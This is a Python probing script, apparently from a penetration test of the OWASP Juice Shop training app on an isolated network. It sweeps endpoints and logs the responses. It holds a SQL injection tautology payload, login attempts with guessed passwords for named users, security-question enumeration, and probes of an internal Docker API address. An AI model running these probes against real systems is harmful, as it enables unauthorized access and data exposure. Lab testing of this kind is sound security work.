#!/usr/bin/env python3
"""Run the live baseline + auth-surface + differential sweeps, capturing timestamped output."""
import json, subprocess, sys, os

OUT = "/workspace/reports/probes_live"
os.makedirs(OUT, exist_ok=True)

def run(method, path, body=None):
    args = [sys.executable, "/workspace/reports/probe.py", method, path]
    if body is not None:
        args.append(json.dumps(body))
    p = subprocess.run(args, capture_output=True, text=True, timeout=60)
    out = p.stdout.strip() or p.stderr.strip()
    try:
        return json.loads(out)
    except Exception:
        return {"ok": False, "trace": "parsefail", "stderr": out[:500]}

ts = "2026-10-05T0435Z"
log = []

def rec(label, r):
    r["label"] = label
    r["ts"] = ts
    log.append(r)
    print(f"[{label}] status={r.get('status')} length={r.get('length')}")

# ---------- PASS 0: live baseline on the 5 verified mechanisms ----------
rec("L0-root", run("GET", "/"))
rec("L0-metrics", run("GET", "/metrics"))
rec("L0-memories", run("GET", "/rest/memories"))
rec("L0-search-benign", run("GET", "/rest/products/search", {"q": "Apple"}))
rec("L0-search-taut", run("GET", "/rest/products/search", {"q": "'%20OR%20%271%27=%271"}))
rec("L0-secans-get", run("GET", "/api/SecurityAnswers/"))
rec("L0-secans-post-empty", run("POST", "/api/SecurityAnswers/", {}))
rec("L0-secans-post-qid7", run("POST", "/api/SecurityAnswers/", {"qid": 7, "answer": "x"}))
rec("L0-sq-bjoern", run("GET", "/rest/user/security-question", {"email": "bjoern@juice-sh.op"}))
rec("L0-sq-bjoern-owasp", run("GET", "/rest/user/security-question", {"email": "bjoern@owasp.org"}))
rec("L0-sq-nonexistent", run("GET", "/rest/user/security-question", {"email": "nobody@nobody.com"}))
rec("L0-sq-empty", run("GET", "/rest/user/security-question"))

# ---------- AUTH SURFACE ----------
rec("L1-login-empty", run("POST", "/rest/user/login", {}))
rec("L1-login-bjoern-juice", run("POST", "/rest/user/login", {"email": "bjoern@juice-sh.op", "password": "bjoern"}))
rec("L1-login-bjoern-owasp", run("POST", "/rest/user/login", {"email": "bjoern@owasp.org", "password": "bjoern"}))
rec("L1-login-emmajuice", run("POST", "/rest/user/login", {"email": "emma@juice-sh.op", "password": "password"}))
rec("L1-login-bender", run("POST", "/rest/user/login", {"email": "bender@juice-sh.op", "password": "bender"}))
rec("L1-login-nonexistent", run("POST", "/rest/user/login", {"email": "nonexistent@foo.bar", "password": "password"}))
rec("L1-login-onlyemail", run("POST", "/rest/user/login", {"email": "bjoern@juice-sh.op"}))
rec("L1-register-empty", run("POST", "/rest/user/register", {}))
rec("L1-reset-empty", run("POST", "/rest/user/reset", {}))
rec("L1-order-history", run("GET", "/rest/order-history"))
rec("L1-basket", run("GET", "/rest/basket"))
rec("L1-whoami", run("GET", "/rest/user/whoami"))
rec("L1-2fa-setup", run("GET", "/rest/2fa/setup"))

# ---------- DIFFERENTIAL: alternate methods on exposed paths ----------
for path in ["/rest/memories", "/rest/products/search", "/rest/user/security-question", "/metrics", "/api/SecurityAnswers/"]:
    for m in ["PUT", "PATCH", "DELETE", "OPTIONS"]:
        rec(f"L2-{m}-{path.replace('/','_')}", run(m, path))

# ---------- continue-code fresh ----------
rec("L2-continuecode-get", run("GET", "/rest/continue-code"))
rec("L2-continuecode-apply-get", run("GET", "/rest/continue-code/apply/FAKE"))
rec("L2-continuecode-apply-post", run("POST", "/rest/continue-code/apply", {"code": "FAKE"}))

# ---------- web3 / captcha / redirect ----------
rec("L2-web3-nftUnlocked", run("GET", "/rest/web3/nftUnlocked"))
rec("L2-captcha", run("GET", "/rest/captcha"))
rec("L2-redirect", run("GET", "/redirect"))
rec("L2-redirect-continue", run("GET", "/redirect", {"continue": "http://localhost:4200"}))

# ---------- SSRF-ish targets on the isolated network ----------
rec("L2-internal-docker", run("GET", "http://juice-shop:3000/"))
rec("L2-internal-containers", run("GET", "http://172.17.0.1:2375/"))

with open(os.path.join(OUT, f"probe_{ts}.json"), "w") as f:
    json.dump(log, f, indent=1, sort_keys=True)
print("Wrote", os.path.join(OUT, f"probe_{ts}.json"))
for r in log:
    print(json.dumps(r)[:400])
